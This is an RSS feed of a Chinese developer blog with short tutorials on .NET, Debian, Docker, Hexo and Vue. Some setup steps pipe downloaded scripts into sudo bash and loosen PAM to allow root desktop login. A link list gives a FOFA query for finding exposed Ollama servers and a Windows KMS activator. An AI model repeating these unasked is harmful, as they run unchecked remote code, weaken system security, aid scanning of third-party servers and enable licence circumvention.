using System; using System.Diagnostics; namespace DisplayProcessMemory { class Program { static void Main(string[] args) { // 获取当前进程 Process currentProcess = Process.GetCurrentProcess(); // 使用需要的内存量 long workingSet64 = currentProcess.WorkingSet64; // 显示内存使用量 Console.WriteLine($&amp;#34;当前进程占用内存: {workingSet64} 字节&amp;#34;); // 单位转换为兆字节 double memoryInMB = workingSet64 / 1024.0 / 1024.0; Console.WriteLine($&amp;#34;当前进程占用内存: {memoryInMB.ToString(&amp;#34;F2&amp;#34;)} MB&amp;#34;); } } } 在.NET中，可以使用System.Diagnostics命名空间下的Process类来获取当前进程的信息，但是直接获取网络带宽使用情况不是Process类提供的功能。你可以使用System.Net.NetworkInformation命名空间下的IPGlobalProperties类来获取网络接口的信息，然后累计所有网络接口的传输数据量来估算带宽使用。
以下是一个简单的示例代码，用于显示当前进程的网络传输数据量（发送和接收）：
using System; using System.Diagnostics; using System.Net.NetworkInformation; class Program { static void Main() { Process currentProcess = Process.GetCurrentProcess(); Console.WriteLine($&amp;#34;Process ID: {currentProcess.</description></item><item><title>Debian Nodejs HEXO</title><link>https://qfsyso.github.io/posts/debian-nodejs-hexo/</link><pubDate>Fri, 03 May 2024 17:02:53 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-nodejs-hexo/</guid><description>Debian Nodejs HEXO
安装Node.js环境 sudo apt update debian安装最新node v20.12.0 在Debian系统上安装特定版本的Node.js（例如v20.12.0），你可以使用NodeSource二进制分发。以下是安装v20.12.0的步骤：
首先，打开终端。
使用curl下载NodeSource的安装脚本：
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 安装Node.js：
sudo apt-get install -y nodejs 验证Node.js是否安装成功：
node --version 如果你想要确保安装了特定的v20.12.0版本，可以在安装完Node.js后运行以下命令来验证版本：
node -v 如果显示的版本号是v20.12.0，则表示已经成功安装了该版本。
安装HEXO 使用npm包管理器，直接安装hexo
npm install hexo -g hexo init blog cd blog npm install hexo server hexo 修改端口号 _config.yml # 或者使用 vim _config.yml
Docs: https://hexo.io/docs/server.html server: port: 12311 # 修改这里为你想要的端口号 compress: true header: true hexo s</description></item><item><title> .NET netty proto</title><link>https://qfsyso.github.io/posts/.net-netty-proto/</link><pubDate>Fri, 03 May 2024 02:09:32 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-netty-proto/</guid><description>DotNetty是微软的Azure团队，使用C#实现的Netty的版本发布。不但使用了C#和.Net平台的技术特点，并且保留了Netty原来绝大部分的编程接口。让我们在使用时，完全可以依照Netty官方的教程来学习和使用DotNetty应用程序。
Netty 是一个异步事件驱动的网络应用程序框架，用于快速开发可维护的高性能协议服务器和客户端。
优点 关注点分离——业务和网络逻辑解耦； 模块化和可复用性； 可测试性作为首要的要求 历史 阻塞Socket通信特点：
建立连接要阻塞线程，读取数据要阻塞线程 如果要管理多个客户端，就需要为每个客户端建立不同的线程 会有大量的线程在休眠状态，等待接收数据，资源浪费 每个线程都要占用系统资源 线程的切换很耗费系统资源 非阻塞Socket（NIO）特点： 每个Socket如果需要读写操作，都通过事件通知的方式通知选择器，这样就实现了一个线程管理多个Socket的目的。 ​
选择器甚至可以在所有的Socket空闲的时候允许线程先去干别的事情 减少了线程数量导致的资源占用，减少了线程切换导致的资源消耗
Protobuf wakeng</description></item><item><title>.NET 检测地址/主机/域名是否正常</title><link>https://qfsyso.github.io/posts/.net-%E6%A3%80%E6%B5%8B%E5%9C%B0%E5%9D%80/%E4%B8%BB%E6%9C%BA/%E5%9F%9F%E5%90%8D%E6%98%AF%E5%90%A6%E6%AD%A3%E5%B8%B8/</link><pubDate>Sun, 28 Apr 2024 19:09:40 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-%E6%A3%80%E6%B5%8B%E5%9C%B0%E5%9D%80/%E4%B8%BB%E6%9C%BA/%E5%9F%9F%E5%90%8D%E6%98%AF%E5%90%A6%E6%AD%A3%E5%B8%B8/</guid><description>🌱PING 地址/主机名/域名
/// &amp;lt;summary&amp;gt; /// PING /// &amp;lt;/summary&amp;gt; /// &amp;lt;param name=&amp;#34;ip&amp;#34;&amp;gt;ip&amp;lt;/param&amp;gt; /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt; public static bool PingIp(string ip) { System.Net.NetworkInformation.Ping p = new System.Net.NetworkInformation.Ping(); System.Net.NetworkInformation.PingOptions options = new System.Net.NetworkInformation.PingOptions(); options.DontFragment = true; string data = &amp;#34;Test Data!&amp;#34;; byte[] buffer = Encoding.ASCII.GetBytes(data); int timeout = 2000; // Timeout System.Net.NetworkInformation.PingReply reply = p.Send(ip, timeout, buffer, options); if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) { // AddToConvo(ip + reply.Status); return true; } else { // AddToConvo(ip + reply.</description></item><item><title>.NET Avalonia Linux</title><link>https://qfsyso.github.io/posts/.net-avalonia-linux/</link><pubDate>Sat, 27 Apr 2024 00:07:15 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-avalonia-linux/</guid><description>环境WIN10 VS2022 debian
👻前言 Avalonia 是一个用于创建跨平台用户界面 (UI) 的开源框架。它是一个基于 .NET 平台的框架，允许开发者使用 XAML 和 C#（F#）来构建跨平台的应用程序。Avalonia 的目标是提供与 Windows Presentation Foundation (WPF) 类似的开发体验，但能够在 Windows、macOS 和 Linux 等多个平台上运行。
使用 Avalonia，开发者可以创建各种类型的应用程序，包括桌面应用、移动应用和嵌入式应用。一些可以通过 Avalonia 实现的功能和应用包括：
桌面应用程序：如办公软件、IDE、游戏客户端等。
移动应用程序：通过 Avalonia 可以构建支持多个平台的移动应用，如 Windows、macOS 和 Linux 上的移动应用。
跨平台工具：Avalonia 可以用于构建跨平台的开发工具、实用工具等。
游戏开发：Avalonia 也可以用于构建游戏的用户界面，适合基于 .NET 平台的游戏开发。
Avalonia 提供了一个强大的工具集，使开发者能够创建具有各种功能和样式的跨平台应用程序。
💻安装Avalonia 选择管理拓展，点击下载，安装
​
​
📦创建项目 ​
​
​
编码&amp;hellip;
📚在win下运行 ​
查看linux内核
uname -a
​
🔑打包发布 复制到linux
授予权限
📻在linux下运行 迁移Socket发布到linux ​
​
实现win linux web 基于socket实时聊天</description></item><item><title>Debian Gnome-Desktop GUI</title><link>https://qfsyso.github.io/posts/debian-gnome-desktop-gui/</link><pubDate>Fri, 26 Apr 2024 23:19:27 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-gnome-desktop-gui/</guid><description>debian gnome-desktop
🌞更新 sudo apt update sudo apt -y upgrade ​
🎨安装 sudo apt -y install task-gnome-desktop 这个过程比较久
​
🍎分配 sudo systemctl set-default graphical.target vi /etc/pam.d/gdm-password ``` bash 注释 auth required pam_succeed_if.so user != root quiet_success ``` bash #auth required pam_succeed_if.so user != root quiet_success 🛋️重启 sudo reboot 🔑通过VNC连接 ​
配置后
​</description></item><item><title>HarmonyOS Study ArkTS</title><link>https://qfsyso.github.io/posts/harmonyos-study-arkts/</link><pubDate>Sun, 21 Apr 2024 13:00:43 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos-study-arkts/</guid><description>💡 环境搭建 HarmonyOS开发环境搭建
DevEco Studio安装 https://developer.huawei.com/consumer/cn/deveco-studio/
​
🚀安装nodejs ​
🤵安装ohpm ​
🍔安装SDK ​
​
💥Emulator安装 ​
Q:The graphic card OpenGL version is too old for Previewer to work..
解决方法分两步：
1、下载enGL库：https://github.com/pal1000/mesa-dist-win/releases/download/23.1.1/mesa3d-23.1.1-release-msvc.7z
2、解压下载的zip文件,双击执行systemwidedeploy.cmd文件，然后按任意键，出现一个菜单，选择1，然后开始安装OpenGL驱动，出现complete 后关闭终端，重新运行程序即可生效。
🌶️新建ArkTs项目 ​
​
​
entry：HarmonyOS工程模块，编译构建生成一个HAP包。
src &amp;gt; main &amp;gt; ets：用于存放ets源码。 src &amp;gt; main &amp;gt; ets &amp;gt; MainAbility：应用/服务的入口。 src &amp;gt; main &amp;gt; ets &amp;gt; MainAbility &amp;gt; pages：MainAbility包含的页面。 src &amp;gt; main &amp;gt; ets &amp;gt; MainAbility &amp;gt; pages &amp;gt; index.ets：pages列表中的第一个页面，即应用的首页入口。 src &amp;gt; main &amp;gt; ets &amp;gt; MainAbility &amp;gt; app.</description></item><item><title> .NET 反编译</title><link>https://qfsyso.github.io/posts/.net-%E5%8F%8D%E7%BC%96%E8%AF%91/</link><pubDate>Sun, 21 Apr 2024 06:14:22 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-%E5%8F%8D%E7%BC%96%E8%AF%91/</guid><description>反编译是对程序进行逆向分析、研究，以推导出软件产品所使用的思路、原理、结构、算法、处理过程、运行方法等设计要素。
反编译.NET程序需要使用专门的反编译工具
🧿使用dotPeek进行反编译 1.下载dotPeek dotPeek：JetBrains 出品的免费 .NET 反编译器与程序集浏览器
​
2.File &amp;gt; Open
​
3.打开需要反编译的文件方法
​
🧝‍♂️使用ILSpy进行反编译 下载并安装 ILSpy：https://github.com/icsharpcode/ILSpy/releases 2.文件-打开-exe
​
3.查看反编译内容
找到Form1 可以看到里面反编译的内容
​
复制到vs里面
替换代码添加相关引用即可
🤖使用Reflector进行反编译 1.File &amp;gt; Open Assembly
​ ​
2.点开WinTime.exe内容
​
3.查看反编译内容
可以看到反编译出来的控件和方法 ​
点开方法，可以看到方法内的内容
注意：
反编译的代码可能不完全等同于原始源代码，因为编译器可能会进行优化，并且某些信息可能因为混淆技术而无法恢复。</description></item><item><title> .NET SMTP</title><link>https://qfsyso.github.io/posts/.net-smtp/</link><pubDate>Sat, 20 Apr 2024 21:13:11 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-smtp/</guid><description>SMTP（Simple Mail Transfer Protocol）是用于电子邮件传输的规则集，可以从邮件客户端向接收电子邮件服务器发送、中继或转发邮件。发件人可使用SMTP 服务器来执行发送电子邮件的过程。SMTP服务器则是按照这些规则中转电子邮件的服务器。
IMAP可以理解为收邮件。 ​
🐧使用QQ邮箱发邮件 首先需要设置开启邮箱的SMTP服务
登录(https://mail.qq.com/)电脑网页版邮箱进入【设置】-&amp;gt;【帐户】-&amp;gt;【POP3/IMAP/SMTP服务】， 开启或关闭相应服务最后保存更改即可。 ​
QQ邮箱 POP3 和 SMTP 服务器地址设置如下：
邮箱 POP3服务器（端口995） SMTP服务器（端口465或587） qq.com pop.qq.com smtp.qq.com SMTP服务器需要身份验证。
以下是示例代码：
using ConsoleApp1Test; //xxx string server = &amp;#34;smtp.qq.com&amp;#34;; string username = &amp;#34;my test email&amp;#34;; string password = &amp;#34;xxx; string from = &amp;#34;from@qq.com&amp;#34;; string to = &amp;#34;to@qq.com&amp;#34;; string subject = &amp;#34;Test Email&amp;#34;; string content = &amp;#34;This is a test email sent asynchronously.&amp;#34;; bool isHtml = false; // 是否为 HTML 格式 try { bool success = await MailHelper.</description></item><item><title>Socket to WebSocket</title><link>https://qfsyso.github.io/posts/socket-to-websocket/</link><pubDate>Sat, 20 Apr 2024 12:56:50 +0000</pubDate><guid>https://qfsyso.github.io/posts/socket-to-websocket/</guid><description>前言 针对IOS App Proxy Server无法直连WebSocket，建立 Socket中转端。
​
WebSocket 端：
WebSocket 端用于实现实时通信功能。
WebSocket 端通过 WebSocket 协议与中转端通信，中转端可以通过 WebSocket 或其他传输协议与 WebSocket 端建立连接，收发消息。
定义 SendMessageToChatRoomIP 和 JoinChatRoom，用于处理来自客户端的消息和连接事件。
中转端 C1 （Socket Server）：
中转端 C1 是一个独立的应用程序，用于连接WebSocket端，建立Socket服务。
中转端 C1 的主要功能是接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。
客户端 C2 x N ：
客户端 C2 ，主要与中转端连接 发送数据，接收数据。
在客户端 C2 中，连接到中转端 C1、发送消息给中转端 C1、接收来自中转端 C1 的消息。
调用关系为：
客户端 C2 通过与中转端 C1 的通信，向 WebSocket 端发送消息或接收来自 WebSocket 端的消息。
中转端 C1 接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。</description></item><item><title>.NET JWT</title><link>https://qfsyso.github.io/posts/.net-jwt/</link><pubDate>Fri, 19 Apr 2024 01:26:35 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-jwt/</guid><description>前言
JWT (JSON Web Token) 是一种安全传输信息的开放标准，由Header、Payload和Signature三部分组成。它主要用于身份验证、信息交换和授权。JWT可验证用户身份，确保访问权限，实现单点登录，并在客户端和服务器之间安全地交换信息。因其简单、安全和便捷，JWT在现代Web应用中广泛使用。
用JWT有多个原因：
无状态的身份验证：JWT允许服务器无需保存用户的会话信息，因为所有必要的信息都存储在令牌本身中。这降低了服务器的存储需求，并提高了系统的可扩展性。
跨域身份验证：由于JWT是自我包含的，并且可以被轻松传递，因此它非常适合跨域身份验证。用户可以在一个服务上验证身份，然后使用相同的令牌访问另一个服务，从而实现单点登录（SSO）。
安全性：JWT可以通过使用强大的加密算法（如HS256, RS256等）进行签名，以确保其完整性和真实性。服务器可以使用公钥验证令牌的签名，从而确保它没有被篡改，并且确实是由受信任的颁发者签发的。
减少数据库查询：由于用户的身份信息都存储在JWT中，服务器无需每次都去数据库中查询用户的身份信息，从而减少了数据库的压力和查询时间。
可定制性：JWT的Payload部分可以包含自定义的信息，如用户角色、权限等，这使得JWT非常灵活，并可以根据具体需求进行定制。
易于分发和共享：JWT可以轻松地通过网络传输，并且可以在多个服务和客户端之间共享，这使得它在微服务架构和分布式系统中非常有用。
标准化和互操作性：JWT是一个开放标准（RFC 7519），这意味着不同的系统和语言都可以使用相同的方式生成和验证JWT，从而提高了系统的互操作性。
环境 Win10 VS2022 .NET8
✨ 建立项目jwttest 1.创建TestJwtController ​
2.下载JWT ​
3.建实体类 /// &amp;lt;summary&amp;gt; /// 用户信息类 /// &amp;lt;/summary&amp;gt; public class LoginRs { /// &amp;lt;summary&amp;gt; /// 用户ID /// &amp;lt;/summary&amp;gt; public string UserId { get; set; } /// &amp;lt;summary&amp;gt; /// 用户密码 /// &amp;lt;/summary&amp;gt; public string PasswordMD5 { get; set; } } /// &amp;lt;summary&amp;gt; /// 用户登录信息类 /// &amp;lt;/summary&amp;gt; public class LoginInfo { /// &amp;lt;summary&amp;gt; /// 用户信息 /// &amp;lt;/summary&amp;gt; public string UserId { get; set; } /// &amp;lt;summary&amp;gt; /// 检验时间 /// &amp;lt;/summary&amp;gt; public DateTime Expires { get; set; } } /// &amp;lt;summary&amp;gt; /// rsmodel /// &amp;lt;/summary&amp;gt; public class RsModel { /// &amp;lt;summary&amp;gt; /// 是否成功 /// &amp;lt;/summary&amp;gt; public bool isOk { get; set; } /// &amp;lt;summary&amp;gt; /// 返回值 /// &amp;lt;/summary&amp;gt; public int code { get; set; } /// &amp;lt;summary&amp;gt; /// 返回消息 /// &amp;lt;/summary&amp;gt; public string msg { get; set; } /// &amp;lt;summary&amp;gt; /// 返回数据 /// &amp;lt;/summary&amp;gt; public object rsData { get; set; } } 4.</description></item><item><title>.NET spider</title><link>https://qfsyso.github.io/posts/.net-spider/</link><pubDate>Thu, 18 Apr 2024 12:59:30 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-spider/</guid><description>前言 爬虫可以用于外汇，期货，基金，货币，比分，电商，文章等信息的采集。通过数据分析，竞品分析，为商业决策提供数据支持。
​ 金价暴涨，抓取下今日的金价。
💡使用HttpClient爬取数据 try { // 创建HttpClient实例 using (var httpClient = new HttpClient()) { //模拟User-Agent httpClient.DefaultRequestHeaders.Add(&amp;#34;User-Agent&amp;#34;, GetUserAgent()); // 发送GET请求并获取响应 xxx.com是某网站的页面~（保护） var response = await httpClient.GetAsync(&amp;#34;https://xxx.com&amp;#34;); response.EnsureSuccessStatusCode(); var htmlContent = await response.Content.ReadAsStringAsync(); } } catch (HttpRequestException ex) { // 处理请求异常 ViewBag.Error = &amp;#34;Failed to retrieve price data: &amp;#34; + ex.Message; } 🚀模拟User-Agent // 生成随机 User-Agent private string GetUserAgent() { string[] userAgents = new string[] { &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.</description></item><item><title>Vue study</title><link>https://qfsyso.github.io/posts/vue-study/</link><pubDate>Wed, 17 Apr 2024 08:59:30 +0000</pubDate><guid>https://qfsyso.github.io/posts/vue-study/</guid><description>前言 Vue.js，这个轻量级且灵活的JavaScript框架，就像一位魔术师，用它的魔法棒将数据和视图巧妙地连接在一起。当数据发生变化时，Vue.js就像变魔术一样，让视图自动更新，为开发者带来了极大的便利。
Vue.js的诞生，源于一位名叫尤雨溪的开发者对前端开发的热爱与追求。在Google工作期间，他受到了Angular的启发，决定开发一款更加轻量、灵活的框架。于是，Vue.js应运而生，它的名字来源于“View”的缩写，寓意着它专注于视图层的开发。Vue.js不断地完善和发展。它引入了响应式数据绑定、组件化开发等核心概念，让前端开发变得更加高效和可维护。
👋 Vue环境搭建 首先，搭一个打代码的环境
1.安装node.js 在使用VS Code之前，需要安装Vue的开发环境。
安装Vue的最简单方法是使用npm包管理器，先安装Node.js和npm。
node官网 =&amp;gt; https://nodejs.org/en/download
2.配置环境变量 在nodejs安装目录下新建node_cache（nodejs缓存）、node_global（全局包存放）两个文件夹，如下图所示。
​​
打开cmd命令提示符，配置文件路径如下：
​​
配置环境变量
​​
系统属性-&amp;gt;高级-&amp;gt;环境变量-&amp;gt;新增环境变量： ​​
系统变量 ​​
​​
3.VSCode配置 Visual Studio Code
以管理员身份运行VSCode
VSCode安装插件ESLint
安装js打包工具
npm install -g webpack ​​
​​
4.安装Vue CLI npm install -g vue-cli (vue-cli npm install @vue/cli -g --unsafe-perm) 5.在VS Code中打开Vue项目 5.1. 在VS Code中，File &amp;gt; Open Folder&amp;hellip; 选择“文件”&amp;gt; “打开文件夹”。 ​​
5.2. 找到Vue项目文件夹，选择“文件夹”并打开。 ​​
可以根据需要，在Extensions安装VSCode的中文扩展。
5.3也可以通过Vue UI 创建一个新的Vue项目然后打开 vue ui ​​</description></item><item><title>.NET i18n</title><link>https://qfsyso.github.io/posts/.net-i18n/</link><pubDate>Tue, 16 Apr 2024 01:29:17 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-i18n/</guid><description>环境 WIN10 VS2022 .NET8
👋创建项目 ​
👀创建Resources Controllers HomeController.en.resx
​ HomeController.fr.resx
​ HomeController.zh.resx
​
🌱Program.cs添加国际化支持 // 添加国际化支持 builder.Services.AddLocalization(options =&amp;gt; { options.ResourcesPath = &amp;#34;Resources&amp;#34;; }); var app = builder.Build(); // 多语言 var supportedCultures = new List&amp;lt;CultureInfo&amp;gt; { new CultureInfo(&amp;#34;en&amp;#34;), new CultureInfo(&amp;#34;zh&amp;#34;), new CultureInfo(&amp;#34;fr&amp;#34;), }; app.UseRequestLocalization(new RequestLocalizationOptions { DefaultRequestCulture = new RequestCulture(&amp;#34;zh&amp;#34;), SupportedCultures = supportedCultures, SupportedUICultures = supportedCultures }); ⚡注入localizer private readonly IStringLocalizer&amp;lt;HomeController&amp;gt; localizer; public HomeController(ILogger&amp;lt;HomeController&amp;gt; logger, IStringLocalizer&amp;lt;HomeController&amp;gt; localizer) { _logger = logger; this.</description></item><item><title>MySQL Incorrect string value</title><link>https://qfsyso.github.io/posts/mysql-incorrect-string-value/</link><pubDate>Sat, 13 Apr 2024 09:27:51 +0000</pubDate><guid>https://qfsyso.github.io/posts/mysql-incorrect-string-value/</guid><description>MySQL存储IOS传过来emoji错误处理 Incorrect string value: ‘‘ for column ‘xxx‘ at row MySQL Incorrect string value: ‘\xF0\x9F\x8D\xBA‘ for column ‘xxx‘ at row
​
调用接口提示
Incorrect string value: &amp;lsquo;\xF0\x9F\x8D\xBA&amp;rsquo; for column &amp;lsquo;xxx&amp;rsquo; at row
😵‍💫
需要把mysql字段排序规则
utf8mb4_0900_ai_ci
改成
utf8mb4_unicode_ci
​
💤SQL调整 ALTER TABLE MUser CHANGE Signature Signature VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL;
设置该列的字符集为utf8mb4。utf8mb4是MySQL中的一个字符集，它可以存储四字节的UTF-8字符，因此可以支持更多的Unicode字符，如某些表情符号。 设置该列的校对规则为utf8mb4_unicode_ci。校对规则决定了字符如何比较和排序。utf8mb4_unicode_ci是一个不区分大小写的校对规则，它基于Unicode标准。 ALTER DATABASE IDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci;
设置该数据库的字符集为utf8mb4。
设置该数据库的校对规则为utf8mb4_unicode_ci。
​
💤服务端连接调整 ChatSet utf8mb4</description></item><item><title>Debian Docker Redis</title><link>https://qfsyso.github.io/posts/debian-docker-redis/</link><pubDate>Fri, 12 Apr 2024 09:27:49 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-docker-redis/</guid><description>Debian安装docker
1.使用官方脚本自动安装docker 安装命令如下：
curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 如果安装提示
-bash sudo command not found
则需要
#update sudo apt-get update sudo apt-get install sudo 再执行安装脚本1
安装成功后可以输入 docker命令查看docker版本
#version docker --version 能查到表明安装成功
2.pull redis #pull redis docker pull redis:latest pull redis镜像 3.创建reids容器 docker run -itd --name redis-test -p 6379:6379 redis 4.测试redis docker exec -it redis-test /bin/bash redis-cli set test 1 get test set test 1 提示ok
get test 一些命令</description></item><item><title>.NET SignalR Redis</title><link>https://qfsyso.github.io/posts/.net-signalr-redis/</link><pubDate>Fri, 12 Apr 2024 07:44:04 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-signalr-redis/</guid><description>环境 Win10 VS2022 .NET8 Docker Redis
前言
什么是 SignalR？ ASP.NET Core SignalR 是一个开放源代码库，可用于简化向应用添加实时 Web 功能。 实时 Web 功能使服务器端代码能够将内容推送到客户端。
适合 SignalR 的候选项：
需要从服务器进行高频率更新的应用。 （游戏、社交网络、投票、拍卖、地图和 GPS 应用） 仪表板和监视应用。 （公司仪表板、即时销售更新或出行警报） 协作应用。 （包括白板应用和团队会议软件） 需要通知的应用。（ 社交网络、电子邮件、聊天、游戏等） SignalR 提供用于创建服务器到客户端的远程过程调用 (RPC) API。 RPC 从服务器端 .NET Core 代码调用客户端上的函数。支持JavaScript ，.NET ，JAVA，Swift （官方没有明确支持，这是第三方库）其中每个平台都有各自的客户端 SDK。 因此，RPC 调用所调用的编程语言有所不同。
ASP.NET Core SignalR 的一些功能：
自动处理连接管理。 同时向所有连接的客户端发送消息。 例如聊天室。 向特定客户端或客户端组发送消息。 对其进行缩放，以处理不断增加的流量。 SignalR 中心协议 1.👋nuget引入SignalR ​​ ​
2.👀创建SignalR Hub
using Microsoft.AspNetCore.SignalR; using System.Threading.Tasks; namespace WebSignalR { public class ChatHub : Hub { public async Task SendMessage(string user, string message) { await Clients.</description></item><item><title>.NET Swagger</title><link>https://qfsyso.github.io/posts/.net-swagger/</link><pubDate>Thu, 11 Apr 2024 23:27:19 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-swagger/</guid><description>开发环境 Win10 VS2022 .NET8.0
1.从NuGet添加Swagger ​
在解决方案资源管理器中右键单击项目&amp;gt;管理 NuGet 包 将包源设置为“nuget.org” 确保启用“包括预发行”选项 在搜索框中输入“Swashbuckle.AspNetCore” 从“浏览”选项卡中选择最新的“Swashbuckle.AspNetCore”包，然后单击“安装”
2.将 Swagger 生成器添加到以下位置的服务集合中Program.cs： builder.Services.AddControllers(); builder.Services.AddEndpointsApiExplorer(); builder.Services.AddSwaggerGen(); ​
启用中间件 生成
app.UseSwagger(); app.UseSwaggerUI(); app.UseSwaggerUI(options =&amp;gt; { options.SwaggerEndpoint(&amp;#34;/swagger/v1/swagger.json&amp;#34;, &amp;#34;v1&amp;#34;); options.RoutePrefix = string.Empty; }); ​
3.添加API控制器 创建api
// GET api/&amp;lt;myapi&amp;gt;/5 /// &amp;lt;summary&amp;gt; /// getid /// &amp;lt;/summary&amp;gt; /// &amp;lt;param name=&amp;#34;id&amp;#34;&amp;gt;id参数&amp;lt;/param&amp;gt; /// &amp;lt;returns&amp;gt;valuestr&amp;lt;/returns&amp;gt; [HttpGet(&amp;#34;{id}&amp;#34;)] public string Get(int id) { return &amp;#34;value&amp;#34; + id; } // POST api/&amp;lt;myapi&amp;gt; [HttpPost] public string Post([FromBody] string value) { //post逻辑代码 return &amp;#34;myPost&amp;#34;; } // PUT api/&amp;lt;myapi&amp;gt;/5 [HttpPut(&amp;#34;{id}&amp;#34;)] public string Put(int id, [FromBody] string value) { //put逻辑代码 return &amp;#34;myPut&amp;#34;; } // DELETE api/&amp;lt;myapi&amp;gt;/5 [HttpDelete(&amp;#34;{id}&amp;#34;)] public string Delete(int id) { //delete逻辑代码 return &amp;#34;myDelete&amp;#34;; } ​</description></item><item><title>Docker MySQL</title><link>https://qfsyso.github.io/posts/docker-mysql/</link><pubDate>Thu, 11 Apr 2024 08:35:22 +0000</pubDate><guid>https://qfsyso.github.io/posts/docker-mysql/</guid><description>1.下载docker desktop https://www.docker.com/products/docker-desktop/
创建容器 docker run 创建并启动mysql容器
&amp;ndash;name 容器名字
-d 后台运行容器
-p 映射端口
-e 参数
截至目前最新的mysql是mysql8.0.36 那就整这个试下。
docker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=你的密码 mysql:8.0.36-debian ​
等待一会，看到mysql已经pull下来。
回到docker看到容器已经创建。
​
​
可以输入docker images查看
​
3.创建mysql数据库管理软件容器
docker run --name myadmin -d --link mysql-container:db -p 8880:80 phpmyadmin/phpmyadmin ​
回到docker查看下容器是否创建成功。 ​
复制地址到浏览器访问。 ​
​
okok
唉哟不错哦~
扩展：ubuntu版本
docker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=xxxxxx ubuntu/mysql:8.0-22.04_beta https://hub.docker.com/r/ubuntu/mysql?uuid=D64B1F2A-A81A-4D2C-B66B-FCFAECE77EFE</description></item><item><title>Hello World Hexo</title><link>https://qfsyso.github.io/posts/hello-world-hexo/</link><pubDate>Wed, 20 Mar 2024 22:16:01 +0000</pubDate><guid>https://qfsyso.github.io/posts/hello-world-hexo/</guid><description>Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
Quick Start Create a new post npm install hexo-cli -g hexo init blog cd blog npm install hexo server $ hexo new &amp;#34;My New Post&amp;#34; More info: Writing
Run server $ hexo server More info: Server</description></item><item><title>some code</title><link>https://qfsyso.github.io/posts/some-code/</link><pubDate>Thu, 03 Aug 2023 02:12:50 +0000</pubDate><guid>https://qfsyso.github.io/posts/some-code/</guid><description>something git chatbox https://github.com/Bin-Huang/chatbox Desktop Client App for AI Models/LLMs (GPT, Claude, Gemini, Ollama&amp;hellip;)
fofa https://fofa.info/ app=&amp;ldquo;Ollama&amp;rdquo; &amp;amp;&amp;amp; is_domain=false https://github.com/ollama/ollama/blob/main/docs/api.md
dbeaver sql工具 https://github.com/dbeaver/dbeaver/releases
sing-boxyg https://github.com/yonggekkk/sing-box-yg
music-desktop https://github.com/lyswhut/lx-music-desktop
RDP、VNC、SSH 远程 https://github.com/mRemoteNG/mRemoteNG
clash linux https://github.com/Elegycloud/clash-for-linux-backup
ssh https://github.com/cmliu/webssh https://github.com/chaos-zhu/easynode https://github.com/crazypeace/huashengdun-webssh https://github.com/huashengdun/webssh https://github.com/Jrohy/webssh
docker run -d --name webssh --restart always -p 18888:8888 cmliu/webssh:latest v2rayN https://github.com/2dust/v2rayN/
ClashX.Meta https://github.com/MetaCubeX/ClashX.Meta/tree/meta
AssetBundle工具 解压uti .bundle 文件 https://github.com/Perfare/AssetStudio/releases
mpvplaer https://github.com/mpvnet-player/mpv.net
h5 game https://github.com/hackycy/h5-game-collection
win激活 https://github.com/zbezj/HEU_KMS_Activator
twitter awe https://github.com/DennisThink/awesome_twitter_CN?tab=readme-ov-file
pyvideotrans https://github.com/jianchang512/pyvideotrans</description></item><item><title>100件小事</title><link>https://qfsyso.github.io/posts/100%E4%BB%B6%E5%B0%8F%E4%BA%8B/</link><pubDate>Mon, 20 Feb 2023 10:27:36 +0000</pubDate><guid>https://qfsyso.github.io/posts/100%E4%BB%B6%E5%B0%8F%E4%BA%8B/</guid><description>
